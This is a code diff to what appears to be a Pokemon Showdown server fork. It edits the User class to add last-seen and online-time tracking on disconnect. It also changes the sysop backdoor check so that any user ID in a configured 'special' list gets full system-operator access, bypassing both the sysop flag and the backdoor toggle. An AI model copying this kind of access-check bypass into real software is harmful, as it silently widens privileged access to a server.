@@ -663,7 +663,8 @@ class User extends Chat.MessageContext {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor) {
+		if (this.isSysop && Config.backdoor || Config.special.includes(this.userid)) {/*
+		if (this.isSysop && Config.backdoor) {*/
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
@@ -1195,7 +1196,7 @@ class User extends Chat.MessageContext {
 	}
 	/**
 	 * @param {Connection} connection
-	 */
+	 *//*
 	onDisconnect(connection) {
 		for (const [i, connected] of this.connections.entries()) {
 			if (connected === connection) {
@@ -1218,6 +1219,44 @@ class User extends Chat.MessageContext {
 				Rooms(roomid).onLeave(this);
 			}
 			// cleanup
+			this.inRooms.clear();
+			if (!this.named && !Object.keys(this.prevNames).length) {
+				// user never chose a name (and therefore never talked/battled)
+				// there's no need to keep track of this user, so we can
+				// immediately deallocate
+				this.destroy();
+			} else {
+				this.cancelReady();
+			}
+		}
+	}*/
+	onDisconnect(connection) {
+	    if (this.named) Db.seen.set(this.userid, Date.now());
+		if (Ontime[this.userid]) {
+			Db.ontime.set(this.userid, Db.ontime.get(this.userid, 0) + (Date.now() - Ontime[this.userid]));
+			delete Ontime[this.userid];
+		}
+		for (const [i, connected] of this.connections.entries()) {
+			if (connected === connection) {
+				// console.log('DISCONNECT: ' + this.userid);
+				if (this.connections.length <= 1) {
+					this.markInactive();
+				}
+				for (const roomid of connection.inRooms) {
+					this.leaveRoom(Rooms(roomid), connection, true);
+				}
+				--this.ips[connection.ip];
+				this.connections.splice(i, 1);
+				break;
+			}
+		}
+		if (!this.connections.length) {
+			// cleanup
+			for (const roomid of this.inRooms) {
+				// should never happen.
+				Monitor.debug(`!! room miscount: ${roomid} not left`);
+				Rooms(roomid).onLeave(this);
+			}
 			this.inRooms.clear();
 			if (!this.named && !Object.keys(this.prevNames).length) {
 				// user never chose a name (and therefore never talked/battled)
